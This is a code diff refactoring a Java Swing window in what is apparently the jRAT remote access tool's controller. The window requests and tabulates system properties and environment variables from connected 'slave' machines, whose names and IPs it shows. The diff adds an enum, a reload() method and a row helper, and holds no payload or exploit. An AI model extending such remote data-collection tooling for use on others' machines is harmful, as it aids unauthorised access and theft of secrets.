@@ -35,13 +35,16 @@ import se.jrat.controller.ui.components.DefaultJTable;
 @SuppressWarnings("serial")
 public class FrameSystemVariables extends BaseFrame {
 
-	private JPanel contentPane;
-	public JTable table;
 	public static final Map<Slave, FrameSystemVariables> INSTANCES = new HashMap<Slave, FrameSystemVariables>();
-	public TableModel model;
 
-	public FrameSystemVariables(final int mode, Slave s) {
+	private JPanel contentPane;
+	private JTable table;
+	private TableModel model;
+	private Constants.VariableMode mode;
+
+	public FrameSystemVariables(Constants.VariableMode mode, Slave s) {
 		super(s);
+		this.mode = mode;
 		addWindowListener(new WindowAdapter() {
 			@Override
 			public void windowClosing(WindowEvent arg0) {
@@ -51,12 +54,17 @@ public class FrameSystemVariables extends BaseFrame {
 		INSTANCES.put(slave, this);
 		
 		setResizable(false);
-		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameSystemVariables.class.getResource("/icons/properties.png")));
-		setTitle("System Properties - " + "[" + slave.getDisplayName() + "] - " + slave.getIP());
-		if (mode == Constants.MODE_ENV) {
+		
+		if (mode == Constants.VariableMode.ENVIRONMENT_VARIABLES) {
 			setIconImage(Toolkit.getDefaultToolkit().getImage(FrameSystemVariables.class.getResource("/icons/categories.png")));
 			setTitle("Environment Variables - " + "[" + slave.getDisplayName() + "] - " + slave.getIP());
+		} else if (mode == Constants.VariableMode.SYSTEM_PROPERTIES) {
+			setIconImage(Toolkit.getDefaultToolkit().getImage(FrameSystemVariables.class.getResource("/icons/properties.png")));
+			setTitle("System Properties - " + "[" + slave.getDisplayName() + "] - " + slave.getIP());
+		} else {
+			throw new RuntimeException("Invalid mode");
 		}
+		
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 450, 302);
 		contentPane = new JPanel();
@@ -68,13 +76,7 @@ public class FrameSystemVariables extends BaseFrame {
 		JButton btnReload = new JButton("Reload");
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				if (mode == Constants.MODE_PROP) {
-					clear();
-					slave.addToSendQueue(new Packet90SystemProperties());
-				} else if (mode == Constants.MODE_ENV) {
-					clear();
-					slave.addToSendQueue(new Packet96EnvironmentVariables());
-				}
+				reload();
 			}
 		});
 		btnReload.setIcon(IconUtils.getIcon("update"));
@@ -120,9 +122,16 @@ public class FrameSystemVariables extends BaseFrame {
 		table.getColumnModel().getColumn(1).setPreferredWidth(268);
 		scrollPane.setViewportView(table);
 		contentPane.setLayout(gl_contentPane);
-		if (mode == Constants.MODE_PROP) {
+
+		reload();
+	}
+	
+	public void reload() {
+		if (mode == Constants.VariableMode.SYSTEM_PROPERTIES) {
+			clear();
 			slave.addToSendQueue(new Packet90SystemProperties());
-		} else if (mode == Constants.MODE_ENV) {
+		} else if (mode == Constants.VariableMode.ENVIRONMENT_VARIABLES) {
+			clear();
 			slave.addToSendQueue(new Packet96EnvironmentVariables());
 		}
 	}
@@ -139,4 +148,7 @@ public class FrameSystemVariables extends BaseFrame {
 		}
 	}
 
+	public void add(String k, String v) {
+		model.addRow(new Object[] { k, v });
+	}
 }
